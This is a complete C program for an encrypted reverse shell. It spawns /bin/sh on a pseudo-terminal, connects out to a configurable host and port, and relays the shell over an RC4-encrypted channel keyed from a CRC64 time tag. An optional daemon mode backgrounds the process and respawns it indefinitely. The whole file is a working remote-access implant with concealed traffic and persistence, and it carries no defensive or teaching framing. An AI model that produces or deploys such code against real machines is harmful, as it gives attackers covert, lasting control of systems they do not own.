#include <arpa/inet.h>
#include <errno.h>
#include <pty.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// Connection settings
#ifndef ENCRYPTION_KEY
#define ENCRYPTION_KEY "CHANGE_ME"
#endif

#ifndef CONNECT_HOST
#define CONNECT_HOST "127.0.0.1"
#endif

#ifndef CONNECT_PORT
#define CONNECT_PORT 4444
#endif

#ifndef SHELL_COMMAND
#define SHELL_COMMAND "/bin/sh"
#endif

#ifndef DAEMONIZE
#define DAEMONIZE 0
#endif

#define BUFFER_LENGTH 1024

// Macros
#define UINT64_TO_BIG_ENDIAN_ARRAY(x, arr)             \
    {                                                  \
        uint64_t _num = (x);                           \
        if (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__) \
            _num = __builtin_bswap64(_num);            \
        memcpy((arr), &_num, sizeof(_num));            \
    }

#define SWAP(a, b)     \
    {                  \
        __typeof(a) t; \
        t = a;         \
        a = b;         \
        b = t;         \
    }

#define STRINGIZE_DETAIL(x) #x
#define STRINGIZE(x) STRINGIZE_DETAIL(x)
#define FATAL(msg)                                             \
    {                                                          \
        if (!DAEMONIZE)                                        \
            perror(__FILE__ ":" STRINGIZE(__LINE__) ": " msg); \
        exit(errno ? errno : 1);                               \
    }

#define CHECK_ERROR(func_call)         \
    ({                                 \
        __auto_type ret = (func_call); \
        if (ret < 0)                   \
            FATAL(#func_call);         \
        ret;                           \
    })

#define DEBUG_PROCESS_EXIT(status, msg)                     \
    do                                                      \
    {                                                       \
        if (DAEMONIZE)                                      \
            break;                                          \
        if (WIFEXITED(status))                              \
            fprintf(stderr, msg "with status %d\n",         \
                    WEXITSTATUS(status));                   \
        else if (WIFSIGNALED(status))                       \
            fprintf(stderr, msg "with signal %d\n",         \
                    WTERMSIG(status));                      \
        else                                                \
            fprintf(stderr, msg "with unknown status %d\n", \
                    status);                                \
    } while (0)

#define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL

typedef struct rc4_state
{
    uint8_t i;
    uint8_t j;
    uint8_t s[256];
} rc4_state;

/**
 * RC4 key scheduling
 * @param state RC4 state, initialized with key scheduling
 * @param key key
 * @param keylen key length
 */
void rc4_init(rc4_state *state, const char *key, int keylen)
{
    uint8_t j = 0;
    for (int i = 0; i < 256; i++)
        state->s[i] = i;
    for (int i = 0; i < 256; i++)
    {
        j = (j + state->s[i] + key[i % keylen]) % 256;
        SWAP(state->s[i], state->s[j]);
    }
    state->i = 0;
    state->j = 0;
}

/**
 * RC4 implementation
 * @param state RC4 state
 * @return next byte in the keystream
 */
uint8_t rc4_next(rc4_state *state)
{
    state->i = (state->i + 1) % 256;
    state->j = (state->j + state->s[state->i]) % 256;
    SWAP(state->s[state->i], state->s[state->j]);
    return state->s[(state->s[state->i] + state->s[state->j]) % 256];
}

/**
 * CRC64 implementation based on CRC64-ECMA-182
 * @param s input string
 * @return CRC64 hash
 */
uint64_t crc64(const char *s)
{
    // Initialization value for the CRC (based on CRC64-ECMA)
    uint64_t crc = 0;
    size_t i, j;

    // Process each byte of the string
    for (i = 0; s[i] != '\0'; i++)
    {
        crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC

        // Process each bit in the byte
        for (j = 0; j < 8; j++)
        {
            if (crc & (1ULL << 63))
            {
                crc = (crc << 1) ^ CRC64_ECMA_182_POLY;
            }
            else
            {
                crc <<= 1;
            }
        }
    }

    return crc;
}

int main()
{
    pid_t pid;

#if DAEMONIZE
    for (int i = 0; i < 2; i++)
    {
        pid = CHECK_ERROR(fork());
        if (pid > 0)
            return 0;
    }
#endif

    for (;;)
    {
        pid = CHECK_ERROR(fork());
        if (pid == 0)
            break;

        int status;
        waitpid(pid, &status, 0);
        DEBUG_PROCESS_EXIT(status, "Daemon child exited ");
        sleep(1);
    }

    // Create a pty
    int master, slave;
    CHECK_ERROR(openpty(&master, &slave, NULL, NULL, NULL));

    // Fork
    pid = CHECK_ERROR(fork());
    if (pid == 0)
    {
        // Child
        // Close the master side of the pty
        close(master);

        CHECK_ERROR(dup2(slave, STDIN_FILENO));
        CHECK_ERROR(dup2(slave, STDOUT_FILENO));
        CHECK_ERROR(dup2(slave, STDERR_FILENO));

        // Execute a shell
        CHECK_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));
        return 0;
    }

    // Parent
    // Close the slave side of the pty
    close(slave);

    // Create a socket
    int sockfd = CHECK_ERROR(socket(AF_INET, SOCK_STREAM, 0));

    // Specify an address to connect to
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CONNECT_PORT);
    addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);

    // Connect it
    CHECK_ERROR(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)));

    // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
    time_t tag_time = time(NULL);
    char tag_string[sizeof(ENCRYPTION_KEY) + 16];
    sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);

    uint64_t tag = crc64(tag_string);
    char tag_buf[sizeof(tag)];
    UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);

    // mangle encryption key to ensure difference every time
    char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
    for (size_t i = 0; i < sizeof(ENCRYPTION_KEY); i++)
        mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];

    // Send tag
    CHECK_ERROR(send(sockfd, &tag_buf, sizeof(tag_buf), 0));

    // Initialize RC4 states
    rc4_state rc4recv, rc4send;
    rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
    rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);

    // Create duplex socket connection by polling
    int fd_max = sockfd > master ? sockfd : master;
    char buffer[BUFFER_LENGTH];

    for (;;)
    {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sockfd, &readfds);
        FD_SET(master, &readfds);

        CHECK_ERROR(select(fd_max + 1, &readfds, NULL, NULL, NULL));

        ssize_t n;
        // Read from socket and write to pty
        if (FD_ISSET(sockfd, &readfds))
            for (;;)
            {
                n = CHECK_ERROR(recv(sockfd, buffer, sizeof(buffer), 0));
                if (n == 0)
                    goto end_loop;
                for (ssize_t i = 0; i < n; i++)
                    buffer[i] ^= rc4_next(&rc4recv);
                CHECK_ERROR(write(master, buffer, n));
                // Break if the buffer is not full (i.e., no more data to read)
                if ((size_t)n < sizeof(buffer))
                    break;
            }

        // Read from pty and write to socket
        if (FD_ISSET(master, &readfds))
            for (;;)
            {
                n = CHECK_ERROR(read(master, buffer, sizeof(buffer)));
                if (n == 0)
                    goto end_loop;
                for (ssize_t i = 0; i < n; i++)
                    buffer[i] ^= rc4_next(&rc4send);
                CHECK_ERROR(send(sockfd, buffer, n, 0));
                if ((size_t)n < sizeof(buffer))
                    break;
            }
    }

end_loop:
    kill(-pid, SIGTERM);
    shutdown(sockfd, SHUT_WR);
    close(master);
    return 0;
}